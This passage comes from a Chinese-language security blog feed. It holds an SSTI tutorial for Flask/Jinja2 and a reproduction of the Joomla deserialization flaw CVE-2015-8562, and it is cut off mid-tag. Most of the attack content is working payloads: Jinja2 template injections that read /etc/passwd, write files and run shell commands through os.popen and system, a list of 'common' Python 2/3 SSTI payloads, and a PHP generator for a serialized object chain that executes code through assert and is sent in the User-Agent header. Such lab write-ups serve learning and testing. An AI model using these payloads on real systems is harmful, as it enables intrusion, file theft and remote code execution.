&#39;pkg_resources._vendor.pyparsing.ParserElement._FifoCache&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParserElement&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing._NullToken&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.OnlyOnce&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.pyparsing_common&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.markers.Node&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.markers.Marker&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.requirements.Requirement&#39;&gt;, &lt;class &#39;pkg_resources.IMetadataProvider&#39;&gt;, &lt;class &#39;pkg_resources.WorkingSet&#39;&gt;, &lt;class &#39;pkg_resources.Environment&#39;&gt;, &lt;class &#39;pkg_resources.ResourceManager&#39;&gt;, &lt;class &#39;pkg_resources.NullProvider&#39;&gt;, &lt;class &#39;pkg_resources.NoDists&#39;&gt;, &lt;class &#39;pkg_resources.EntryPoint&#39;&gt;, &lt;class &#39;pkg_resources.Distribution&#39;&gt;, &lt;class &#39;gunicorn.pidfile.Pidfile&#39;&gt;, &lt;class &#39;CArgObject&#39;&gt;, &lt;class &#39;_ctypes.CThunkObject&#39;&gt;, &lt;class &#39;_ctypes._CData&#39;&gt;, &lt;class &#39;_ctypes.CField&#39;&gt;, &lt;class &#39;_ctypes.DictRemover&#39;&gt;, &lt;class &#39;ctypes.CDLL&#39;&gt;, &lt;class &#39;ctypes.LibraryLoader&#39;&gt;, &lt;class &#39;gunicorn.sock.BaseSocket&#39;&gt;, &lt;class &#39;gunicorn.arbiter.Arbiter&#39;&gt;, &lt;class &#39;gettext.NullTranslations&#39;&gt;, &lt;class &#39;argparse._AttributeHolder&#39;&gt;, &lt;class &#39;argparse.HelpFormatter._Section&#39;&gt;, &lt;class &#39;argparse.HelpFormatter&#39;&gt;, &lt;class &#39;argparse.FileType&#39;&gt;, &lt;class &#39;argparse._ActionsContainer&#39;&gt;, &lt;class &#39;shlex.shlex&#39;&gt;, &lt;class &#39;ipaddress._IPAddressBase&#39;&gt;, &lt;class &#39;ipaddress._BaseV4&#39;&gt;, &lt;class &#39;ipaddress._IPv4Constants&#39;&gt;, &lt;class &#39;ipaddress._BaseV6&#39;&gt;, &lt;class &#39;ipaddress._IPv6Constants&#39;&gt;, &lt;class &#39;_ssl._SSLContext&#39;&gt;, &lt;class &#39;_ssl._SSLSocket&#39;&gt;, &lt;class &#39;_ssl.MemoryBIO&#39;&gt;, &lt;class &#39;_ssl.Session&#39;&gt;, &lt;class &#39;ssl.SSLObject&#39;&gt;, &lt;class &#39;gunicorn.reloader.InotifyReloader&#39;&gt;, &lt;class &#39;gunicorn.config.Config&#39;&gt;, &lt;class &#39;gunicorn.config.Setting&#39;&gt;, &lt;class &#39;gunicorn.debug.Spew&#39;&gt;, &lt;class &#39;gunicorn.app.base.BaseApplication&#39;&gt;, &lt;class &#39;pickle._Framer&#39;&gt;, &lt;class &#39;pickle._Unframer&#39;&gt;, &lt;class &#39;pickle._Pickler&#39;&gt;, &lt;class &#39;pickle._Unpickler&#39;&gt;, &lt;class &#39;_pickle.Unpickler&#39;&gt;, &lt;class &#39;_pickle.Pickler&#39;&gt;, &lt;class &#39;_pickle.Pdata&#39;&gt;, &lt;class &#39;_pickle.PicklerMemoProxy&#39;&gt;, &lt;class &#39;_pickle.UnpicklerMemoProxy&#39;&gt;, &lt;class &#39;queue.Queue&#39;&gt;, &lt;class &#39;logging.handlers.QueueListener&#39;&gt;, &lt;class &#39;socketserver.BaseServer&#39;&gt;, &lt;class &#39;socketserver.ForkingMixIn&#39;&gt;, &lt;class &#39;socketserver.ThreadingMixIn&#39;&gt;, &lt;class &#39;socketserver.BaseRequestHandler&#39;&gt;, &lt;class &#39;logging.config.ConvertingMixin&#39;&gt;, &lt;class &#39;logging.config.BaseConfigurator&#39;&gt;, &lt;class &#39;gunicorn.glogging.Logger&#39;&gt;, &lt;class &#39;gunicorn.http.unreader.Unreader&#39;&gt;, &lt;class &#39;gunicorn.http.body.ChunkedReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.LengthReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.EOFReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.Body&#39;&gt;, &lt;class &#39;gunicorn.http.message.Message&#39;&gt;, &lt;class &#39;gunicorn.http.parser.Parser&#39;&gt;, &lt;class &#39;gunicorn.http.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;gunicorn.http.wsgi.Response&#39;&gt;, &lt;class &#39;gunicorn.workers.workertmp.WorkerTmp&#39;&gt;, &lt;class &#39;gunicorn.workers.base.Worker&#39;&gt;, &lt;class &#39;_json.Scanner&#39;&gt;, &lt;class &#39;_json.Encoder&#39;&gt;, &lt;class &#39;json.decoder.JSONDecoder&#39;&gt;, &lt;class &#39;json.encoder.JSONEncoder&#39;&gt;, &lt;class &#39;jinja2.utils.MissingType&#39;&gt;, &lt;class &#39;jinja2.utils.LRUCache&#39;&gt;, &lt;class &#39;jinja2.utils.Cycler&#39;&gt;, &lt;class &#39;jinja2.utils.Joiner&#39;&gt;, &lt;class &#39;jinja2.utils.Namespace&#39;&gt;, &lt;class &#39;markupsafe._MarkupEscapeHelper&#39;&gt;, &lt;class &#39;jinja2.nodes.EvalContext&#39;&gt;, &lt;class &#39;jinja2.nodes.Node&#39;&gt;, &lt;class &#39;jinja2.runtime.TemplateReference&#39;&gt;, &lt;class &#39;jinja2.runtime.Context&#39;&gt;, &lt;class &#39;jinja2.runtime.BlockReference&#39;&gt;, &lt;class &#39;jinja2.runtime.LoopContextBase&#39;&gt;, &lt;class &#39;jinja2.runtime.LoopContextIterator&#39;&gt;, &lt;class &#39;jinja2.runtime.Macro&#39;&gt;, &lt;class &#39;jinja2.runtime.Undefined&#39;&gt;, &lt;class &#39;decimal.Decimal&#39;&gt;, &lt;class &#39;decimal.Context&#39;&gt;, &lt;class &#39;decimal.SignalDictMixin&#39;&gt;, &lt;class &#39;decimal.ContextManager&#39;&gt;, &lt;class &#39;numbers.Number&#39;&gt;, &lt;class &#39;jinja2.lexer.Failure&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStreamIterator&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStream&#39;&gt;, &lt;class &#39;jinja2.lexer.Lexer&#39;&gt;, &lt;class &#39;jinja2.parser.Parser&#39;&gt;, &lt;class &#39;jinja2.visitor.NodeVisitor&#39;&gt;, &lt;class &#39;jinja2.idtracking.Symbols&#39;&gt;, &lt;class &#39;jinja2.compiler.MacroRef&#39;&gt;, &lt;class &#39;jinja2.compiler.Frame&#39;&gt;, &lt;class &#39;jinja2.environment.Environment&#39;&gt;, &lt;class &#39;jinja2.environment.Template&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateModule&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateExpression&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateStream&#39;&gt;, &lt;class &#39;jinja2.loaders.BaseLoader&#39;&gt;, &lt;class &#39;jinja2.bccache.Bucket&#39;&gt;, &lt;class &#39;jinja2.bccache.BytecodeCache&#39;&gt;, &lt;class &#39;concurrent.futures._base._Waiter&#39;&gt;, &lt;class &#39;concurrent.futures._base._AcquireFutures&#39;&gt;, &lt;class &#39;concurrent.futures._base.Future&#39;&gt;, &lt;class &#39;concurrent.futures._base.Executor&#39;&gt;, &lt;class &#39;multiprocessing.process.BaseProcess&#39;&gt;, &lt;class &#39;array.array&#39;&gt;, &lt;class &#39;multiprocessing.reduction._C&#39;&gt;, &lt;class &#39;multiprocessing.reduction.AbstractReducer&#39;&gt;, &lt;class &#39;multiprocessing.context.BaseContext&#39;&gt;, &lt;class &#39;_multiprocessing.SemLock&#39;&gt;, &lt;class &#39;multiprocessing.util.Finalize&#39;&gt;, &lt;class &#39;multiprocessing.util.ForkAwareThreadLock&#39;&gt;, &lt;class &#39;multiprocessing.connection._ConnectionBase&#39;&gt;, &lt;class &#39;multiprocessing.connection.Listener&#39;&gt;, &lt;class &#39;multiprocessing.connection.SocketListener&#39;&gt;, &lt;class &#39;multiprocessing.connection.ConnectionWrapper&#39;&gt;, &lt;class &#39;concurrent.futures.process._ExceptionWithTraceback&#39;&gt;, &lt;class &#39;concurrent.futures.process._WorkItem&#39;&gt;, &lt;class &#39;concurrent.futures.process._ResultItem&#39;&gt;, &lt;class &#39;concurrent.futures.process._CallItem&#39;&gt;, &lt;class &#39;concurrent.futures.thread._WorkItem&#39;&gt;, &lt;class &#39;asyncio.events.Handle&#39;&gt;, &lt;class &#39;asyncio.events.AbstractServer&#39;&gt;, &lt;class &#39;asyncio.events.AbstractEventLoop&#39;&gt;, &lt;class &#39;asyncio.events.AbstractEventLoopPolicy&#39;&gt;, &lt;class &#39;asyncio.coroutines.CoroWrapper&#39;&gt;, &lt;class &#39;asyncio.futures._TracebackLogger&#39;&gt;, &lt;class &#39;asyncio.futures.Future&#39;&gt;, &lt;class &#39;_asyncio.Future&#39;&gt;, &lt;class &#39;_asyncio.FutureIter&#39;&gt;, &lt;class &#39;TaskStepMethWrapper&#39;&gt;, &lt;class &#39;TaskWakeupMethWrapper&#39;&gt;, &lt;class &#39;asyncio.locks._ContextManager&#39;&gt;, &lt;class &#39;asyncio.locks._ContextManagerMixin&#39;&gt;, &lt;class &#39;asyncio.locks.Event&#39;&gt;, &lt;class &#39;asyncio.protocols.BaseProtocol&#39;&gt;, &lt;class &#39;asyncio.queues.Queue&#39;&gt;, &lt;class &#39;asyncio.streams.StreamWriter&#39;&gt;, &lt;class &#39;asyncio.streams.StreamReader&#39;&gt;, &lt;class &#39;asyncio.subprocess.Process&#39;&gt;, &lt;class &#39;asyncio.transports.BaseTransport&#39;&gt;, &lt;class &#39;asyncio.sslproto._SSLPipe&#39;&gt;, &lt;class &#39;asyncio.unix_events.AbstractChildWatcher&#39;&gt;, &lt;class &#39;jinja2.asyncsupport.AsyncLoopContextIterator&#39;&gt;, &lt;class &#39;werkzeug._internal._Missing&#39;&gt;, &lt;class &#39;werkzeug._internal._DictAccessorProperty&#39;&gt;, &lt;class &#39;werkzeug.utils.HTMLBuilder&#39;&gt;, &lt;class &#39;werkzeug.exceptions.Aborter&#39;&gt;, &lt;class &#39;werkzeug.urls.Href&#39;&gt;, &lt;class &#39;email.message.Message&#39;&gt;, &lt;class &#39;http.client.HTTPConnection&#39;&gt;, &lt;class &#39;mimetypes.MimeTypes&#39;&gt;, &lt;class &#39;werkzeug.serving.WSGIRequestHandler&#39;&gt;, &lt;class &#39;werkzeug.serving._SSLContext&#39;&gt;, &lt;class &#39;werkzeug.serving.BaseWSGIServer&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableListMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.UpdateDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ViewItems&#39;&gt;, &lt;class &#39;werkzeug.datastructures._omd_bucket&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Headers&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableHeadersMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.IfRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Range&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ContentRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.FileStorage&#39;&gt;, &lt;class &#39;urllib.request.Request&#39;&gt;, &lt;class &#39;urllib.request.OpenerDirector&#39;&gt;, &lt;class &#39;urllib.request.BaseHandler&#39;&gt;, &lt;class &#39;urllib.request.HTTPPasswordMgr&#39;&gt;, &lt;class &#39;urllib.request.AbstractBasicAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.AbstractDigestAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.URLopener&#39;&gt;, &lt;class &#39;urllib.request.ftpwrapper&#39;&gt;, &lt;class &#39;werkzeug.wrappers.accept.AcceptMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.AuthorizationMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.WWWAuthenticateMixin&#39;&gt;, &lt;class &#39;werkzeug.wsgi.ClosingIterator&#39;&gt;, &lt;class &#39;werkzeug.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;werkzeug.wsgi._RangeWrapper&#39;&gt;, &lt;class &#39;werkzeug.formparser.FormDataParser&#39;&gt;, &lt;class &#39;werkzeug.formparser.MultiPartParser&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base_request.BaseRequest&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base_response.BaseResponse&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagRequestMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagResponseMixin&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgentParser&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgent&#39;&gt;, &lt;class &#39;werkzeug.wrappers.user_agent.UserAgentMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.request.StreamOnlyMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStream&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStreamMixin&#39;&gt;, &lt;class &#39;http.cookiejar.Cookie&#39;&gt;, &lt;class &#39;http.cookiejar.CookiePolicy&#39;&gt;, &lt;class &#39;http.cookiejar.Absent&#39;&gt;, &lt;class &#39;http.cookiejar.CookieJar&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieHeaders&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieResponse&#39;&gt;, &lt;class &#39;werkzeug.test.EnvironBuilder&#39;&gt;, &lt;class &#39;werkzeug.test.Client&#39;&gt;, &lt;class &#39;uuid.UUID&#39;&gt;, &lt;class &#39;itsdangerous._json._CompactJSON&#39;&gt;, &lt;class &#39;hmac.HMAC&#39;&gt;, &lt;class &#39;itsdangerous.signer.SigningAlgorithm&#39;&gt;, &lt;class &#39;itsdangerous.signer.Signer&#39;&gt;, &lt;class &#39;itsdangerous.serializer.Serializer&#39;&gt;, &lt;class &#39;itsdangerous.url_safe.URLSafeSerializerMixin&#39;&gt;, &lt;class &#39;flask._compat._DeprecatedBool&#39;&gt;, &lt;class &#39;werkzeug.local.Local&#39;&gt;, &lt;class &#39;werkzeug.local.LocalStack&#39;&gt;, &lt;class &#39;werkzeug.local.LocalManager&#39;&gt;, &lt;class &#39;werkzeug.local.LocalProxy&#39;&gt;, &lt;class &#39;difflib.SequenceMatcher&#39;&gt;, &lt;class &#39;difflib.Differ&#39;&gt;, &lt;class &#39;difflib.HtmlDiff&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleFactory&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleTemplate&#39;&gt;, &lt;class &#39;werkzeug.routing.BaseConverter&#39;&gt;, &lt;class &#39;werkzeug.routing.Map&#39;&gt;, &lt;class &#39;werkzeug.routing.MapAdapter&#39;&gt;, &lt;class &#39;click._compat._FixupStream&#39;&gt;, &lt;class &#39;click._compat._AtomicFile&#39;&gt;, &lt;class &#39;click.utils.LazyFile&#39;&gt;, &lt;class &#39;click.utils.KeepOpenFile&#39;&gt;, &lt;class &#39;click.utils.PacifyFlushWrapper&#39;&gt;, &lt;class &#39;click.types.ParamType&#39;&gt;, &lt;class &#39;click.parser.Option&#39;&gt;, &lt;class &#39;click.parser.Argument&#39;&gt;, &lt;class &#39;click.parser.ParsingState&#39;&gt;, &lt;class &#39;click.parser.OptionParser&#39;&gt;, &lt;class &#39;click.formatting.HelpFormatter&#39;&gt;, &lt;class &#39;click.core.Context&#39;&gt;, &lt;class &#39;click.core.BaseCommand&#39;&gt;, &lt;class &#39;click.core.Parameter&#39;&gt;, &lt;class &#39;flask.signals.Namespace&#39;&gt;, &lt;class &#39;flask.signals._FakeSignal&#39;&gt;, &lt;class &#39;flask.helpers.locked_cached_property&#39;&gt;, &lt;class &#39;flask.helpers._PackageBoundObject&#39;&gt;, &lt;class &#39;flask.cli.DispatchingApp&#39;&gt;, &lt;class &#39;flask.cli.ScriptInfo&#39;&gt;, &lt;class &#39;flask.config.ConfigAttribute&#39;&gt;, &lt;class &#39;flask.ctx._AppCtxGlobals&#39;&gt;, &lt;class &#39;flask.ctx.AppContext&#39;&gt;, &lt;class &#39;flask.ctx.RequestContext&#39;&gt;, &lt;class &#39;flask.json.tag.JSONTag&#39;&gt;, &lt;class &#39;flask.json.tag.TaggedJSONSerializer&#39;&gt;, &lt;class &#39;flask.sessions.SessionInterface&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json._JSONModule&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json.JSONMixin&#39;&gt;, &lt;class &#39;flask.blueprints.BlueprintSetupState&#39;&gt;&quot;str=str.split(&quot;,&quot;)for i in str:    if &quot;catch_warnings&quot; in i:       # print(i)        print (str.index(i))</code></pre><p>运行脚本得到<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>在列表的166位置</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217103947375.png" alt="image-20211217103947375"></p><p>所以这一步的payload为：</p><pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166]&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217104135330.png" alt="image-20211217104135330"></p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>找到重载过的<strong>init</strong>类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）：</p><pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217104732910.png" alt="image-20211217104732910"></p><h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>查看其引用 <strong>builtins</strong></p><p>Python 程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于 builtins 却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块。</p><pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__['__builtins__']&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217105126261.png" alt="image-20211217105126261"></p><p>这里返回的是字典，里面有许多常用的函数,如果存在，直接调用即可</p><p>使用 keys 中的 file 以实现读取文件的功能：</p><pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__['__builtins__'].['file']('F://GetFlag.txt').read()&#125;&#125;</code></pre><pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__['__builtins__'].['file']('/etc/passwd').read()&#125;&#125;</code></pre><p>写文件</p><pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__['__builtins__'].['file']('/etc/passwd').write()&#125;&#125;</code></pre><p>存在的子模块可以通过 .index() 来进行查询，如果存在的话返回索引，直接调用即可。（这里我还没有搞懂）</p><p>还有另外的方法：</p><pre><code class="python">[].__class__.__base__.__subclasses__()[40](&#39;/etc/passwd&#39;).read()</code></pre><p>写文件换为 .write() 即可。</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><ul><li>利用eval进行命令执行。</li></ul><pre><code class="python">?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")&#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211217111206867.png" alt="image-20211217111206867"></p><ul><li>利用warnings.catch_warnings 进行命令执行。</li></ul><p>首先，查看 warnings.catch_warnings 方法的位置：</p><pre><code class="python">[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)</code></pre><p>查看 linecatch 的位置：</p><pre><code class="python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index(&#39;linecache&#39;)</code></pre><p>查找 os 模块的位置：</p><pre><code class="python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.keys().index(&#39;os&#39;)</code></pre><p>查找 system 方法的位置：</p><pre><code class="python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.keys().index(&#39;system&#39;)</code></pre><p>调用 system 方法：</p><pre><code class="python">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;)</code></pre><ul><li>利用 commands 进行命令执行。</li></ul><pre><code class="python">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()</code></pre><h2 id="官方payload"><a href="#官方payload" class="headerlink" title="官方payload"></a>官方payload</h2><pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("id").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><h2 id="常用的ssti—payload"><a href="#常用的ssti—payload" class="headerlink" title="常用的ssti—payload"></a>常用的ssti—payload</h2><h2 id="python2："><a href="#python2：" class="headerlink" title="python2："></a>python2：</h2><pre><code class="python">#文件读取和写入&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()&#125;&#125;  &#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;  #每次执行都要先写然后编译执行&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg','w').write('code')&#125;&#125;  &#123;&#123; config.from_pyfile('/tmp/owned.cfg') &#125;&#125;  #命令执行&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']('1+1')&#125;&#125;  &#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').system('whoami')")&#125;&#125;#这条指令可以注入，但是如果直接进入python2打这个poc，会报错，用下面这个就不会，可能是python启动会加载了某些模块&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")&#125;&#125;#system函数换为popen(&#39;&#39;).read()，需要导入os模块&#123;&#123;''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")&#125;&#125;#不需要导入os模块，直接从别的模块调用&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code></pre><h2 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h2><pre><code class="python">#读文件&#123;&#123;().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('d://whale.txt').read()&#125;&#125;#命令执行&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")&#125;&#125;#命令执行（变种）&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123;c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;#读文件（变种）&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>joomla 反序列化漏洞(CVE-2015-8562)</title>
      <link href="/2021/12/13/joomla-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2015-8562/"/>
      <url>/2021/12/13/joomla-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2015-8562/</url>
      
        <content type="html"><![CDATA[<h1 id="joomla-反序列化漏洞-CVE-2015-8562"><a href="#joomla-反序列化漏洞-CVE-2015-8562" class="headerlink" title="joomla 反序列化漏洞(CVE-2015-8562)"></a>joomla 反序列化漏洞(CVE-2015-8562)</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>本漏洞根源是PHP5.6.13前的版本在读取存储好的session时，如果反序列化出错则会跳过当前一段数据而去反序列化下一段数据。而Joomla将session存储在Mysql数据库中，编码是utf8，当我们插入4字节的utf8数据时则会导致截断。截断后的数据在反序列化时就会失败，最后触发反序列化漏洞。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2.影响版本"></a>2.影响版本</h2><ul><li>Joomla 1.5.x, 2.x, and 3.x before 3.4.6</li><li>PHP 5.6 &lt; 5.6.13, PHP 5.5 &lt; 5.5.29 and PHP 5.4 &lt; 5.4.45</li></ul><h2 id="3-复现过程"><a href="#3-复现过程" class="headerlink" title="3.复现过程"></a>3.复现过程</h2><p>这里使用vulhub搭建环境</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211213140734457.png" alt="image-20211213140734457"></p><p>环境启动后访问<code>http://your-ip:8080/</code>，按照指示安装即可</p><p>连接数据库：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211213141146828.png" alt="image-20211213141146828"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211213141233555.png" alt="image-20211213141233555"></p><p>安装完成后，访问主页，抓个包</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211213141515900.png" alt="image-20211213141515900"></p><p>先把UA头和Cookie删除，构造数据包，让服务器返回Cookie</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211213142010321.png" alt="image-20211213142010321"></p><p>发起请求：</p><pre><code>GET / HTTP/1.1Host: ip:8080Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://192.168.10.128:8080/installation/index.phpDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0</code></pre><p>返回的Cookie:</p><pre><code>43624f23bf50e5adc955be0e11ed9c2c=390eadc4a6ec125ef32fc0c28c5589be</code></pre><p>然后利用别人的exp生成POC</p><pre><code class="php">&lt;?phpclass JSimplepieFactory &#123;&#125;class JDatabaseDriverMysql &#123;&#125;class SimplePie &#123;    var $sanitize;    var $cache;    var $cache_name_function;    var $javascript;    var $feed_url;    function __construct()    &#123;        $this-&gt;feed_url = &quot;phpinfo();JFactory::getConfig();exit;&quot;;        $this-&gt;javascript = 9999;        $this-&gt;cache_name_function = &quot;assert&quot;;        $this-&gt;sanitize = new JDatabaseDriverMysql();        $this-&gt;cache = true;    &#125;&#125;class JDatabaseDriverMysqli &#123;    protected $a;    protected $disconnectHandlers;    protected $connection;    function __construct()    &#123;        $this-&gt;a = new JSimplepieFactory();        $x = new SimplePie();        $this-&gt;connection = 1;        $this-&gt;disconnectHandlers = [            [$x, &quot;init&quot;],        ];    &#125;&#125;$a = new JDatabaseDriverMysqli();$poc = serialize($a);$poc = str_replace(&quot;\x00*\x00&quot;, &#39;\\0\\0\\0&#39;, $poc);echo &quot;123&#125;__test|&#123;$poc&#125;\xF0\x9D\x8C\x86&quot;;</code></pre><p>运行生成的POC</p><pre><code>123&#125;__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;𝌆</code></pre><p>将这个POC作为User-Agent，带上刚获取的Cookie发包，连续发两次这个包，因为第一次发包，让这个恶意构造的数据存储在数据库中，第二次发包，恶意代码就会被执行</p><p><img 